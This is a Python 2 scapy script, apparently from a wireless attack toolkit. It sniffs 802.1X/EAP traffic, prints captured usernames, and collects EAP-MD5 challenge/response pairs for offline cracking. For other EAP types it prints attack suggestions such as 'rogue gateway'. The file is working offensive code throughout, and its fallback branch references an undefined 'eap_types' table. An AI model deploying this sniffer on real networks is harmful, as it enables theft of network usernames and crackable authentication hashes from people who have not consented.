from scapy.all import *
from multiprocessing import Process

EAP_MD5_ITEMS = { }

def encode_eap_hash(s):

    return ':'.join(s[i:i+2] for i in range(0, len(s), 2))

def analyze_filter(pkt):


    if pkt.haslayer(EAP):

        eap_type = pkt[EAP].type

        if eap_type == 0x1 and pkt[EAP].code == 0x2:

            print '[*] Detected EAP-Identify Response packet...'
            print '[*] Grabbing username...'
            print '[*] Username sniffed:', pkt[EAP].identity

        # props to crEAP.py and EAPMD5crack for original logic
        if eap_type == 0x4:

            eap_id = pkt[EAP].id

            if eap_id not in EAP_MD5_ITEMS:
                EAP_MD5_ITEMS[eap_id] = { }

            if pkt[EAP].code == 0x1:

                challenge = pkt[EAP].value.encode('hex')
                print '[+] EAP-MD5 Authentication Detected'
                print ' |'
                print ' ---| MD5 Request ID |-->', eap_id
                print ' |'
                print ' ---| MD5 Challenge  |-->', encode_eap_hash(challenge)

                EAP_MD5_ITEMS[eap_id]['challenge'] = challenge

            if pkt[EAP].code == 0x2:
            

                response = pkt[EAP].value.encode('hex')
                print ' |'
                print ' ---| MD5 Response   |-->', encode_eap_hash(response)
                print
                EAP_MD5_ITEMS[eap_id]['response'] = response

        elif pkt[EAP].type == 17:
            print '[*] EAP type found: EAP-LEAP'
            print '[*] Suggested attack: rogue gateway'

        elif pkt[EAP].type == 21:
            print '[*] EAP type found: EAP-FAST'
            print '[*] Suggested attack: rogue gateway'

        elif pkt[EAP].type == 32:
            print '[*] EAP type found: EAP-POTP'
            print '[*] Find another device to attack...'

        elif pkt[EAP].type == 47:
            print '[*] EAP type found: EAP-PSK'

        elif pkt[EAP].type == 25:
            print '[*] EAP type found: EAP-PEAP'
            print '[*] Suggested attack: rogue gateway'

        elif pkt[EAP].type == 13:
            print '[*] EAP type found: EAP-TLS... find another device to attack.'

        else:
            print '[*] Skipping packet of type:', eap_types[eap_type]


class Analyzer(object):

    def __init__(self, iface):

        self.iface = iface

    def start(self, timeout):

        self.proc = Process(target=self._start, args=(self.iface, timeout,))
        self.proc.daemon = True
        self.proc.start()

    def stop(self):

        self.proc.terminate()
        self.proc.join()

    @staticmethod
    def _start(iface, timeout):

        sniff(iface=iface, lfilter=analyze_filter, store=0, timeout=timeout)
